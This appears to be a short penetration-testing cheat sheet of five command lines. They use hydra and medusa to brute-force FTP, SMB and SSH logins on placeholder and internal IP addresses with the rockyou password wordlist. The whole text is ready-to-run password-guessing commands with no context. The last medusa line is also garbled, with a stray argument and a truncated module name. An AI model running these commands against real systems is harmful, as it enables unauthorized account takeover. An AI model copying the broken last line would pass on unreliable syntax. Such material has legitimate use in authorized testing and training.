

```
medusa -h ip.ip.ip.ip -u USERNAME -P /usr/share/wordlists/rockyou.txt -M ftp
hydra -L USER_LIST -P PASS_LIST -f -o /data/results/10.10.1.22/scans/10.10.1.22_21_ftphydra.txt -u 10.10.1.22 -s 21 ftp 
hydra -t 1 -V -f -l USER -P /usr/share/wordlists/rockyou.txt $ip smb
hydra -l USERNAME -P /usr/share/wordlists/rockyou.txt -t 10 IP.IP.IP.IP ssh -s 22
medusa -u USER -P /usr/share/wordlists/rockyou.txt -e ns -h IP.IP.IP.IP:22 - 22 -M ss
```

